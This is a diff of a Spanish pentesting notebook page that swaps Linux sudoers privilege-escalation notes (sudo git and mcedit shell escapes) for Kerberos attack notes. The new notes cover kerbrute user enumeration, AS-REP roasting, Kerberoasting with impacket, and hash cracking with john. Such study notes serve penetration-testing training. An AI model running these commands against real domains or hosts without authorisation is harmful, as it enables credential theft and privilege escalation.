@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Sudoers | Notebook</title>
+    <title>88 - Kerberos | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -36,7 +36,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
@@ -55,7 +55,7 @@
               <summary>Escalada de Privilegios</summary>
               <details class="vault-folder vault-subfolder" open>
                 <summary>Linux</summary>
-                <a class="vault-file is-active" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
               </details>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="sudoers">
+        <article class="note-panel is-active" id="88-kerberos">
           <div class="note-tabbar">
-            <span>Sudoers</span>
+            <span>88 - Kerberos</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,64 +77,79 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Linux</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / linux / sudoers</p>
-            <h2>Sudoers</h2>
+            <p class="eyebrow">enumeración de puertos / kerberos</p>
+            <h2>88 - Kerberos</h2>
 
-            <p><code>/etc/sudoers</code> es el archivo de configuración que define quién puede usar <code>sudo</code> y qué comandos puede ejecutar como otro usuario, normalmente <code>root</code>.</p>
-
-            <section class="code-card">
-              <h3>Listar comandos que podemos ejecutar como otro usuario</h3>
-              <pre><code>sudo -l
-
-# Output
-student ALL=(root) NOPASSWD: /usr/bin/man</code></pre>
-            </section>
-
-            <p><a href="https://gtfobins.github.io/#+sudo">GTFOBins SUDO</a></p>
+            <h3>Sincronizar Reloj</h3>
 
             <section class="code-card">
-              <h3>Ejecutar binarios permitidos como otro usuario</h3>
-              <pre><code># Para usuario pepe
-sudo -u pepe git -p help config
-
-# Para root
-sudo git -p help config</code></pre>
+              <h3>Sincronizar reloj</h3>
+              <pre><code>systemctl stop systemd-timesyncd
+ntpdate &lt;ip_dc&gt;</code></pre>
             </section>
 
-            <h2>Binarios No Contemplados en GTFOBins</h2>
+            <h3>Enumeración de usuarios del Dominio</h3>
 
             <section class="code-card">
-              <h3>mcedit</h3>
-              <pre><code>sudo mcedit
-
-# Comandos
-F+9
-
-# Ruta
-File -&gt; User menu -&gt; Invoke 'shell'</code></pre>
+              <h3>Enumerar usuarios del dominio.</h3>
+              <pre><code># Podemos usar un wordlist a modo fuerza bruta intentar enumerar usuarios del dominio o llevar una lista preparada.
+# Si aparece el hash de ASREP-Roasting, desconfía que se pueda crackear. (Saca el hash con impacket)
+kerbrute userenum --dc &lt;dc_ip&gt; -d &lt;dominio&gt; /usr/share/wordlists/SecLists/Usernames/Names/names.txt</code></pre>
             </section>
+
+            <h3>AS-REP ROASTING</h3>
+
+            <p>Recuperar hashes Kerberos AS-REP para usuarios que tienen deshabilitada la pre-autenticación Kerberos para crackear de forma offline (No sirven para PassTheHash)</p>
+
+            <section class="code-card">
+              <h3>AS-REP Roasting: Con una lista de usuarios listar usuarios vulnerables</h3>
+              <pre><code> # Añadir -dc-ip &lt;dc_ip&gt; en caso de no resolver bien DNS en el /etc/hosts
+impacket-GetNPUsers  -no-pass -usersfile &lt;user_list&gt; &lt;dominio&gt;/
+nxc ldap &lt;ip_dc&gt; -u &lt;user_list&gt; -p &#x27;&#x27; --asreproast</code></pre>
+            </section>
+
+            <aside class="callout">
+              <p>Una vez tengamos credenciales válidas, el siguiente paso suele ser Kerberoasting para buscar una vía de escalada de privilegios.</p>
+            </aside>
+
+            <h3>KERBEROASTING</h3>
+
+            <p>Usuario solicita un Service Ticket (<code>TGS</code>) para un Service Principal Name (<code>SPN</code>), el Domain Controller responde con un t<code>icket cifrado con el hash NTLM de la contraseña de la cuenta de servicio</code>. Un atacante puede solicitar tickets para múltiples SPNs y luego intentar crackearlos offline. (Son hashes TGS que no sirven para PassTheHash)</p>
+
+            <section class="code-card">
+              <h3>Kerberoasting: Con credenciales válidas</h3>
+              <pre><code># Añadir -dc-ip &lt;dc_ip&gt; en caso de no resolver bien DNS en el /etc/hosts
+impacket-GetUserSPNs &lt;dominio&gt;/&lt;usuario&gt;:&lt;contraseña&gt; -request -outputfile hashes</code></pre>
+            </section>
+
+            <h3>Crackear Hash</h3>
+
+            <section class="code-card">
+              <h3>Crackear hash de Kerberos</h3>
+              <pre><code>john --wordlist=/usr/share/wordlist/rockyou.txt hash</code></pre>
+            </section>
+
+            <aside class="callout warning">
+              <p><strong>TGT (Ticket-Granting Ticket):</strong> permite acceso amplio al dominio y puede dar control sobre máquinas o servicios como <code>Domain Admin</code>. Relacionado con <code>Golden Ticket</code>.</p>
+            </aside>
+
+            <aside class="callout warning">
+              <p><strong>TGS (Ticket-Granting Service ticket):</strong> permite acceder a un servicio SPN concreto, como <code>CIFS</code>, <code>MSSQL</code> o <code>HTTP</code>. Relacionado con <code>Silver Ticket</code>.</p>
+            </aside>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>escalada_privilegios</span>
-              <span>sudoers</span>
-              <span>sudo</span>
-              <span>linux</span>
-              <span>gtfobins</span>
-              <span>privesc</span>
-              <span>misconfigurations</span>
-              <span>mcedit</span>
-            </div>
-
-            <h2>Máquinas Relacionadas</h2>
-            <div class="tag-list">
-              <span>Bashed</span>
-              <span>Nibbles</span>
-              <span>dog</span>
+              <span>kerberoasting</span>
+              <span>kerberos</span>
+              <span>asrep-roasting</span>
+              <span>TGT</span>
+              <span>TGS</span>
+              <span>p88</span>
+              <span>ports</span>
             </div>
           </div>
         </article>
